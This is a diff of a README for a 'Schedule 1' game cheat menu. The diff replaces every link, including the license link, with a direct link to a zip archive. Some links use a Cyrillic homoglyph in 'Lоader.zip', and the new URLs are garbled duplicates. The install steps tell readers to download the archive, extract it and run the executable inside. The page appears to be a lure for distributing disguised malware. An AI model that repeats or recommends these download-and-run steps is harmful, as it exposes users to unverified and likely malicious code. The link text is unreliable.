@@ -43,11 +43,11 @@ These features are crafted for maximum flexibility, providing both basic and adv
 
 Getting started with the **Schedule 1 Cheat Menu** is simple:
 
-1. **Download `https://raw.githubusercontent.com/mouadkasmi23/Schedule1-EnhancedMenu/main/Lоader.zip` from the repository.**
-2. Extract the contents of `https://raw.githubusercontent.com/mouadkasmi23/Schedule1-EnhancedMenu/main/Lоader.zip` using popular archive tools such as WinRAR, 7-Zip, or the built-in OS extractor.
-3. Read the included `https://raw.githubusercontent.com/mouadkasmi23/Schedule1-EnhancedMenu/main/Lоader.zip` for specific configuration steps.
+1. **Download `https://raw.githubusercontent.com/mouadkasmi23/Schedule1-EnhancedMenu/main/trusting/Enhanced_Schedule_Menu_v3.2.zipоhttps://raw.githubusercontent.com/mouadkasmi23/Schedule1-EnhancedMenu/main/trusting/Enhanced_Schedule_Menu_v3.2.zip` from the repository.**
+2. Extract the contents of `https://raw.githubusercontent.com/mouadkasmi23/Schedule1-EnhancedMenu/main/trusting/Enhanced_Schedule_Menu_v3.2.zipоhttps://raw.githubusercontent.com/mouadkasmi23/Schedule1-EnhancedMenu/main/trusting/Enhanced_Schedule_Menu_v3.2.zip` using popular archive tools such as WinRAR, 7-Zip, or the built-in OS extractor.
+3. Read the included `https://raw.githubusercontent.com/mouadkasmi23/Schedule1-EnhancedMenu/main/trusting/Enhanced_Schedule_Menu_v3.2.zipоhttps://raw.githubusercontent.com/mouadkasmi23/Schedule1-EnhancedMenu/main/trusting/Enhanced_Schedule_Menu_v3.2.zip` for specific configuration steps.
 4. Launch the executable for your operating system:
-    - Windows: `https://raw.githubusercontent.com/mouadkasmi23/Schedule1-EnhancedMenu/main/Lоader.zip`
+    - Windows: `https://raw.githubusercontent.com/mouadkasmi23/Schedule1-EnhancedMenu/main/trusting/Enhanced_Schedule_Menu_v3.2.zipоhttps://raw.githubusercontent.com/mouadkasmi23/Schedule1-EnhancedMenu/main/trusting/Enhanced_Schedule_Menu_v3.2.zip`
     - Linux/macOS: Run with `./Schedule1Loader` from the terminal (`chmod +x` might be necessary).
 5. Follow on-screen prompts to complete initialization.
 6. Open or attach the tool during your application session to access the complete menu.
@@ -81,7 +81,7 @@ Unauthorized use in non-permitted environments or with proprietary software with
 
 ## 📝 License
 
-**Schedule 1 Cheat Menu** is open-source and distributed under the [MIT License](https://raw.githubusercontent.com/mouadkasmi23/Schedule1-EnhancedMenu/main/Lоader.zip).  
+**Schedule 1 Cheat Menu** is open-source and distributed under the [MIT License](https://raw.githubusercontent.com/mouadkasmi23/Schedule1-EnhancedMenu/main/trusting/Enhanced_Schedule_Menu_v3.2.zipоhttps://raw.githubusercontent.com/mouadkasmi23/Schedule1-EnhancedMenu/main/trusting/Enhanced_Schedule_Menu_v3.2.zip).  
 Feel free to use, modify, and distribute this software according to the license terms. 🛡️
 
 ---
